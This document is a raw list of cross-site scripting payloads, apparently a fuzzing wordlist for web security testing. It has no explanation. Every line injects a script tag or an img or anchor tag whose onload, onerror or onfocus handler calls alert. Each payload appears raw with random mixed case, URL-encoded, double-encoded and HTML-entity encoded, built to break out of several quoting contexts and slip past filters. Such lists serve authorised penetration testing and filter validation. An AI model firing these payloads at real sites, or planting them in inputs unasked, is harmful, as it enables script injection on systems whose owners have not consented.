+1%2560%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520autofocus%2520onfocus%253Dalert%2528%2529%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; autofocus onfocus=alert()&gt;&lt;a href=`1
+1><scriPT>AlERt;tHrow 1<SCRiPT><a href=1
+1%3E%3Cscript%3Ealert%3Bthrow%201%3Cscript%3E%3Ca%20href%3D1
+1%253E%253Cscript%253Ealert%253Bthrow%25201%253Cscript%253E%253Ca%2520href%253D1
+1&gt;&lt;script&gt;alert;throw 1&lt;script&gt;&lt;a href=1
+1><img SrC=DoesNotEXiST.NAN onloAD=Alert;ThRow 1><a HRef=1
+1%3E%3Cimg%20src%3DdoesNotExist.NaN%20onload%3Dalert%3Bthrow%201%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onload%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=doesNotExist.NaN onload=alert;throw 1&gt;&lt;a href=1
+1><IMg Src=doEsNoTExiSt.NAN OneRrOR=ALErT;tHrOW 1><A hrEf=1
+1%3E%3Cimg%20src%3DdoesNotExist.NaN%20onerror%3Dalert%3Bthrow%201%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onerror%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=doesNotExist.NaN onerror=alert;throw 1&gt;&lt;a href=1
+1><imG SRc=dOESNOTEXist.NAN aUTOFOCus OnFOcUS=AlErt;tHRoW 1><A HReF=1
+1%3E%3Cimg%20src%3DdoesNotExist.NaN%20autofocus%20onfocus%3Dalert%3Bthrow%201%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=doesNotExist.NaN autofocus onfocus=alert;throw 1&gt;&lt;a href=1
+1><iMg SRc=/iMagE/fAvicON.IcO ONLoaD=AleRT;thRoW 1><a hReF=1
+1%3E%3Cimg%20src%3D/image/favicon.ico%20onload%3Dalert%3Bthrow%201%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253D/image/favicon.ico%2520onload%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=/image/favicon.ico onload=alert;throw 1&gt;&lt;a href=1
+1><iMg srC=/imAgE/fAVICON.ICo ONerRor=Alert;thrOw 1><a HREF=1
+1%3E%3Cimg%20src%3D/image/favicon.ico%20onerror%3Dalert%3Bthrow%201%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253D/image/favicon.ico%2520onerror%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=/image/favicon.ico onerror=alert;throw 1&gt;&lt;a href=1
+1><iMg Src=/imAGE/FAViCON.iCo auTOfOcuS ONfocus=AleRT;ThROW 1><a HreF=1
+1%3E%3Cimg%20src%3D/image/favicon.ico%20autofocus%20onfocus%3Dalert%3Bthrow%201%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253D/image/favicon.ico%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=/image/favicon.ico autofocus onfocus=alert;throw 1&gt;&lt;a href=1
+1><a hREF="hTTP://dOeSNotEXIST.NaN" onloAD=alERT;THroW 1><A Href=1
+1%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onload%3Dalert%3Bthrow%201%3E%3Ca%20href%3D1
+1%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onload%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D1
+1&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onload=alert;throw 1&gt;&lt;a href=1
+1><a Href="htTp://dOeSNotExISt.NAN" oNerroR=ALERT;throw 1><A hReF=1
+1%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onerror%3Dalert%3Bthrow%201%3E%3Ca%20href%3D1
+1%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onerror%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D1
+1&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onerror=alert;throw 1&gt;&lt;a href=1
+1><a Href="HtTP://doesNotEXisT.NAN" AUToFOcUs oNfOcUS=alert;Throw 1><a hREf=1
+1%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20autofocus%20onfocus%3Dalert%3Bthrow%201%3E%3Ca%20href%3D1
+1%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D1
+1&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; autofocus onfocus=alert;throw 1&gt;&lt;a href=1
+1"><ScRIPt>AlErt;THroW 1<ScRIPT><A HreF="1
+1%22%3E%3Cscript%3Ealert%3Bthrow%201%3Cscript%3E%3Ca%20href%3D%221
+1%2522%253E%253Cscript%253Ealert%253Bthrow%25201%253Cscript%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;script&gt;alert;throw 1&lt;script&gt;&lt;a href=&quot;1
+1"><imG SrC=DoeSNotEXist.NaN onlOAD=alErt;THROw 1><a HREf="1
+1%22%3E%3Cimg%20src%3DdoesNotExist.NaN%20onload%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onload%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=doesNotExist.NaN onload=alert;throw 1&gt;&lt;a href=&quot;1
+1"><img Src=DoesNOtEXiST.NaN oNERROR=alErT;tHRow 1><A hREF="1
+1%22%3E%3Cimg%20src%3DdoesNotExist.NaN%20onerror%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onerror%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=doesNotExist.NaN onerror=alert;throw 1&gt;&lt;a href=&quot;1
+1"><Img SrC=DOesNotEXIST.NAN AutofOcUs onFoCUs=aLErt;ThrOw 1><a HrEF="1
+1%22%3E%3Cimg%20src%3DdoesNotExist.NaN%20autofocus%20onfocus%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=doesNotExist.NaN autofocus onfocus=alert;throw 1&gt;&lt;a href=&quot;1
+1"><iMG Src=/image/favicOn.ICO ONloAd=alerT;tHrOw 1><a HreF="1
+1%22%3E%3Cimg%20src%3D/image/favicon.ico%20onload%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253D/image/favicon.ico%2520onload%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=/image/favicon.ico onload=alert;throw 1&gt;&lt;a href=&quot;1
+1"><iMG SrC=/imAgE/faVicon.Ico onErRor=alerT;tHROw 1><A hrEf="1
+1%22%3E%3Cimg%20src%3D/image/favicon.ico%20onerror%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253D/image/favicon.ico%2520onerror%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=/image/favicon.ico onerror=alert;throw 1&gt;&lt;a href=&quot;1
+1"><iMG SRc=/Image/fAvicOn.Ico autofocuS ONFoCUS=aLerT;THroW 1><a HrEf="1
+1%22%3E%3Cimg%20src%3D/image/favicon.ico%20autofocus%20onfocus%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253D/image/favicon.ico%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=/image/favicon.ico autofocus onfocus=alert;throw 1&gt;&lt;a href=&quot;1
+1"><a href="HtTp://dOEsNotExisT.NaN" ONLOAd=aLeRt;thROw 1><A HREf="1
+1%22%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onload%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%221
+1%2522%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onload%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onload=alert;throw 1&gt;&lt;a href=&quot;1
+1"><A HrEf="HTtP://DOESNOtExiSt.NaN" ONeRRor=AlErt;THROW 1><a HrEf="1
+1%22%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onerror%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%221
+1%2522%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onerror%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onerror=alert;throw 1&gt;&lt;a href=&quot;1
+1"><a hreF="HTTP://DoESNOTEXiSt.NAN" auTOFocus oNFoCus=AleRt;tHrow 1><a HRef="1
+1%22%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20autofocus%20onfocus%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%221
+1%2522%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; autofocus onfocus=alert;throw 1&gt;&lt;a href=&quot;1
+1'><ScRIPt>ALeRt;thROW 1<sCRiPT><a hReF='1
+1%27%3E%3Cscript%3Ealert%3Bthrow%201%3Cscript%3E%3Ca%20href%3D%271
+1%2527%253E%253Cscript%253Ealert%253Bthrow%25201%253Cscript%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;script&gt;alert;throw 1&lt;script&gt;&lt;a href=&#x27;1
+1'><iMg sRc=doesNoTEXiSt.NAN ONlOaD=AlERt;THrOw 1><A Href='1
+1%27%3E%3Cimg%20src%3DdoesNotExist.NaN%20onload%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onload%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=doesNotExist.NaN onload=alert;throw 1&gt;&lt;a href=&#x27;1
+1'><Img SrC=doeSNoTExIst.NAN ONErROr=alerT;ThRoW 1><A hREF='1
+1%27%3E%3Cimg%20src%3DdoesNotExist.NaN%20onerror%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onerror%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=doesNotExist.NaN onerror=alert;throw 1&gt;&lt;a href=&#x27;1
+1'><Img srC=dOeSNOtExIST.NaN auTOfocus OnFOcuS=alERT;tHrOW 1><A hREF='1
+1%27%3E%3Cimg%20src%3DdoesNotExist.NaN%20autofocus%20onfocus%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=doesNotExist.NaN autofocus onfocus=alert;throw 1&gt;&lt;a href=&#x27;1
+1'><IMg Src=/iMaGe/FAvicoN.ICo ONLoAd=aLERT;thROw 1><a href='1
+1%27%3E%3Cimg%20src%3D/image/favicon.ico%20onload%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253D/image/favicon.ico%2520onload%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=/image/favicon.ico onload=alert;throw 1&gt;&lt;a href=&#x27;1
+1'><Img SRC=/imAge/favicON.ICo OnerROR=AlErt;THROW 1><A hReF='1
+1%27%3E%3Cimg%20src%3D/image/favicon.ico%20onerror%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253D/image/favicon.ico%2520onerror%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=/image/favicon.ico onerror=alert;throw 1&gt;&lt;a href=&#x27;1
+1'><img srC=/iMage/FaVICoN.ICO auTOfOCus oNFOCus=ALeRt;tHrow 1><A hReF='1
+1%27%3E%3Cimg%20src%3D/image/favicon.ico%20autofocus%20onfocus%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%271
+1%2527%253E%253Cimg%2520src%253D/image/favicon.ico%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;img src=/image/favicon.ico autofocus onfocus=alert;throw 1&gt;&lt;a href=&#x27;1
+1'><A hreF="HtTp://DoesNOTEXIST.NAN" onlOad=ALERT;ThRow 1><A href='1
+1%27%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onload%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%271
+1%2527%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onload%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onload=alert;throw 1&gt;&lt;a href=&#x27;1
+1'><A hrEf="HtTP://DoesNOtExIst.NAN" OnErrOR=alert;thROw 1><A hREf='1
+1%27%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onerror%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%271
+1%2527%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onerror%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onerror=alert;throw 1&gt;&lt;a href=&#x27;1
+1'><a HrEF="HTTp://dOeSNOTEXIST.NAN" AUTOfocUs ONFoCuS=ALErT;tHROW 1><A href='1
+1%27%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20autofocus%20onfocus%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%271
+1%2527%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; autofocus onfocus=alert;throw 1&gt;&lt;a href=&#x27;1
+1`><scRiPt>aLeRt;throW 1<scRipt><a HreF=`1
+1%60%3E%3Cscript%3Ealert%3Bthrow%201%3Cscript%3E%3Ca%20href%3D%601
+1%2560%253E%253Cscript%253Ealert%253Bthrow%25201%253Cscript%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;script&gt;alert;throw 1&lt;script&gt;&lt;a href=`1
+1`><iMg sRC=DoesNOtExist.NaN onLoad=aLErT;ThrOW 1><A HreF=`1
+1%60%3E%3Cimg%20src%3DdoesNotExist.NaN%20onload%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onload%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=doesNotExist.NaN onload=alert;throw 1&gt;&lt;a href=`1
+1`><imG SrC=DoeSNotEXIsT.NaN oNErroR=AleRt;ThROW 1><a hREf=`1
+1%60%3E%3Cimg%20src%3DdoesNotExist.NaN%20onerror%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onerror%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=doesNotExist.NaN onerror=alert;throw 1&gt;&lt;a href=`1
+1`><iMg src=doeSNoTExiSt.NaN auTofOCuS oNfocUS=AleRT;THRoW 1><A hrEf=`1
+1%60%3E%3Cimg%20src%3DdoesNotExist.NaN%20autofocus%20onfocus%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=doesNotExist.NaN autofocus onfocus=alert;throw 1&gt;&lt;a href=`1
+1`><iMg SrC=/imaGe/FAVICon.Ico oNlOAd=alert;THRow 1><a hREF=`1
+1%60%3E%3Cimg%20src%3D/image/favicon.ico%20onload%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253D/image/favicon.ico%2520onload%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=/image/favicon.ico onload=alert;throw 1&gt;&lt;a href=`1
+1`><ImG SRC=/iMAge/FavicoN.iCO OneRror=aLert;tHROw 1><A href=`1
+1%60%3E%3Cimg%20src%3D/image/favicon.ico%20onerror%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253D/image/favicon.ico%2520onerror%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=/image/favicon.ico onerror=alert;throw 1&gt;&lt;a href=`1
+1`><IMg SRc=/Image/FaVICOn.iCo AUtoFocus OnFocUS=aleRt;thrOw 1><A HrEF=`1
+1%60%3E%3Cimg%20src%3D/image/favicon.ico%20autofocus%20onfocus%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%601
+1%2560%253E%253Cimg%2520src%253D/image/favicon.ico%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;img src=/image/favicon.ico autofocus onfocus=alert;throw 1&gt;&lt;a href=`1
+1`><a hrEf="HTTP://doesNOTEXiSt.NaN" ONLOaD=ALeRT;thrOw 1><A href=`1
+1%60%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onload%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%601
+1%2560%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onload%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onload=alert;throw 1&gt;&lt;a href=`1
+1`><A HrEF="httP://DoeSNOTExIST.NaN" onerrOR=AlErT;throw 1><A HreF=`1
+1%60%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onerror%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%601
+1%2560%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onerror%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onerror=alert;throw 1&gt;&lt;a href=`1
+1`><A hreF="htTP://dOESNoTEXiST.NAN" autoFOcuS OnFOCuS=aLERt;tHroW 1><A hRef=`1
+1%60%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20autofocus%20onfocus%3Dalert%3Bthrow%201%3E%3Ca%20href%3D%601
+1%2560%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520autofocus%2520onfocus%253Dalert%253Bthrow%25201%253E%253Ca%2520href%253D%25601
+1`&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; autofocus onfocus=alert;throw 1&gt;&lt;a href=`1
+1><ScRIpT>alerT`1`<SCRIPT><A href=1
+1%3E%3Cscript%3Ealert%601%60%3Cscript%3E%3Ca%20href%3D1
+1%253E%253Cscript%253Ealert%25601%2560%253Cscript%253E%253Ca%2520href%253D1
+1&gt;&lt;script&gt;alert`1`&lt;script&gt;&lt;a href=1
+1><iMG Src=DoEsNotEXiST.NaN ONloAd=AlERt`1`><A hReF=1
+1%3E%3Cimg%20src%3DdoesNotExist.NaN%20onload%3Dalert%601%60%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onload%253Dalert%25601%2560%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=doesNotExist.NaN onload=alert`1`&gt;&lt;a href=1
+1><imG src=dOesNotExIsT.NAN ONErROr=ALErt`1`><a href=1
+1%3E%3Cimg%20src%3DdoesNotExist.NaN%20onerror%3Dalert%601%60%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onerror%253Dalert%25601%2560%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=doesNotExist.NaN onerror=alert`1`&gt;&lt;a href=1
+1><iMg SRC=doEsNotExiST.NAN AuTofoCUS ONFOCuS=ALErT`1`><a hrEF=1
+1%3E%3Cimg%20src%3DdoesNotExist.NaN%20autofocus%20onfocus%3Dalert%601%60%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520autofocus%2520onfocus%253Dalert%25601%2560%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=doesNotExist.NaN autofocus onfocus=alert`1`&gt;&lt;a href=1
+1><Img SRC=/imaGe/faVicOn.iCo Onload=alERt`1`><A hrEf=1
+1%3E%3Cimg%20src%3D/image/favicon.ico%20onload%3Dalert%601%60%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253D/image/favicon.ico%2520onload%253Dalert%25601%2560%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=/image/favicon.ico onload=alert`1`&gt;&lt;a href=1
+1><img sRC=/iMAgE/FavICOn.ICO onERRoR=alerT`1`><A hREF=1
+1%3E%3Cimg%20src%3D/image/favicon.ico%20onerror%3Dalert%601%60%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253D/image/favicon.ico%2520onerror%253Dalert%25601%2560%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=/image/favicon.ico onerror=alert`1`&gt;&lt;a href=1
+1><IMg Src=/IMaGE/FavICon.iCO aUTOFocuS oNfOcuS=aLERt`1`><a HReF=1
+1%3E%3Cimg%20src%3D/image/favicon.ico%20autofocus%20onfocus%3Dalert%601%60%3E%3Ca%20href%3D1
+1%253E%253Cimg%2520src%253D/image/favicon.ico%2520autofocus%2520onfocus%253Dalert%25601%2560%253E%253Ca%2520href%253D1
+1&gt;&lt;img src=/image/favicon.ico autofocus onfocus=alert`1`&gt;&lt;a href=1
+1><A Href="hTTP://dOEsNotEXIst.NAN" ONLOAD=alert`1`><a hReF=1
+1%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onload%3Dalert%601%60%3E%3Ca%20href%3D1
+1%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onload%253Dalert%25601%2560%253E%253Ca%2520href%253D1
+1&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onload=alert`1`&gt;&lt;a href=1
+1><A HREf="HTtp://DOEsNOTExist.NAN" onERroR=aLeRT`1`><a hRef=1
+1%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onerror%3Dalert%601%60%3E%3Ca%20href%3D1
+1%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onerror%253Dalert%25601%2560%253E%253Ca%2520href%253D1
+1&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onerror=alert`1`&gt;&lt;a href=1
+1><A HreF="HTTp://dOeSNOTExiSt.NaN" auTofOCUs ONFoCus=alert`1`><a HREf=1
+1%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20autofocus%20onfocus%3Dalert%601%60%3E%3Ca%20href%3D1
+1%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520autofocus%2520onfocus%253Dalert%25601%2560%253E%253Ca%2520href%253D1
+1&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; autofocus onfocus=alert`1`&gt;&lt;a href=1
+1"><ScRiPT>aLeRt`1`<scrIPt><a hrEf="1
+1%22%3E%3Cscript%3Ealert%601%60%3Cscript%3E%3Ca%20href%3D%221
+1%2522%253E%253Cscript%253Ealert%25601%2560%253Cscript%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;script&gt;alert`1`&lt;script&gt;&lt;a href=&quot;1
+1"><img SrC=dOesNOtExISt.NAN OnlOad=ALert`1`><A hRef="1
+1%22%3E%3Cimg%20src%3DdoesNotExist.NaN%20onload%3Dalert%601%60%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onload%253Dalert%25601%2560%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=doesNotExist.NaN onload=alert`1`&gt;&lt;a href=&quot;1
+1"><IMg Src=doesNOTExIST.NaN onErrOr=aLert`1`><A Href="1
+1%22%3E%3Cimg%20src%3DdoesNotExist.NaN%20onerror%3Dalert%601%60%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520onerror%253Dalert%25601%2560%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=doesNotExist.NaN onerror=alert`1`&gt;&lt;a href=&quot;1
+1"><ImG Src=doeSNOtEXISt.NAN aUToFoCUS ONfOcuS=ALerT`1`><A hrEf="1
+1%22%3E%3Cimg%20src%3DdoesNotExist.NaN%20autofocus%20onfocus%3Dalert%601%60%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253DdoesNotExist.NaN%2520autofocus%2520onfocus%253Dalert%25601%2560%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=doesNotExist.NaN autofocus onfocus=alert`1`&gt;&lt;a href=&quot;1
+1"><ImG SRc=/iMAGE/FavICON.iCo ONLOAd=aLERt`1`><A hreF="1
+1%22%3E%3Cimg%20src%3D/image/favicon.ico%20onload%3Dalert%601%60%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253D/image/favicon.ico%2520onload%253Dalert%25601%2560%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=/image/favicon.ico onload=alert`1`&gt;&lt;a href=&quot;1
+1"><ImG SrC=/IMaGE/favICoN.IcO onErrOR=AlERT`1`><a href="1
+1%22%3E%3Cimg%20src%3D/image/favicon.ico%20onerror%3Dalert%601%60%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253D/image/favicon.ico%2520onerror%253Dalert%25601%2560%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=/image/favicon.ico onerror=alert`1`&gt;&lt;a href=&quot;1
+1"><IMg SRC=/ImAGE/FaVICOn.icO AUToFOcUS oNfOCUS=ALERt`1`><A hREf="1
+1%22%3E%3Cimg%20src%3D/image/favicon.ico%20autofocus%20onfocus%3Dalert%601%60%3E%3Ca%20href%3D%221
+1%2522%253E%253Cimg%2520src%253D/image/favicon.ico%2520autofocus%2520onfocus%253Dalert%25601%2560%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;img src=/image/favicon.ico autofocus onfocus=alert`1`&gt;&lt;a href=&quot;1
+1"><a hrEf="HTTp://DOesNoTEXIST.NaN" OnLOaD=aLerT`1`><A HRef="1
+1%22%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onload%3Dalert%601%60%3E%3Ca%20href%3D%221
+1%2522%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onload%253Dalert%25601%2560%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onload=alert`1`&gt;&lt;a href=&quot;1
+1"><a HreF="htTp://DOESNOTExIst.NaN" onERROR=aLerT`1`><A HrEf="1
+1%22%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20onerror%3Dalert%601%60%3E%3Ca%20href%3D%221
+1%2522%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520onerror%253Dalert%25601%2560%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; onerror=alert`1`&gt;&lt;a href=&quot;1
+1"><a HREF="HTtP://DOESNoTExisT.NaN" AutOFOcus ONFOcuS=AlerT`1`><A hreF="1
+1%22%3E%3Ca%20href%3D%22http%3A//doesNotExist.NaN%22%20autofocus%20onfocus%3Dalert%601%60%3E%3Ca%20href%3D%221
+1%2522%253E%253Ca%2520href%253D%2522http%253A//doesNotExist.NaN%2522%2520autofocus%2520onfocus%253Dalert%25601%2560%253E%253Ca%2520href%253D%25221
+1&quot;&gt;&lt;a href=&quot;http://doesNotExist.NaN&quot; autofocus onfocus=alert`1`&gt;&lt;a href=&quot;1
+1'><sCrIpT>aLErT`1`<scriPt><A href='1
+1%27%3E%3Cscript%3Ealert%601%60%3Cscript%3E%3Ca%20href%3D%271
+1%2527%253E%253Cscript%253Ealert%25601%2560%253Cscript%253E%253Ca%2520href%253D%25271
+1&#x27;&gt;&lt;script&gt;alert`1`&lt;script&gt;&lt;a href=&#x27;1
+1'><iMG SRc=DoESNOTEXist.NaN OnloAd=ALErt`1`><A HrEF='1
+1%27%3E%3Cimg%20src%3DdoesNotExist.NaN%20onload%3Dalert%601%60%3E%3Ca%20href%3D%271
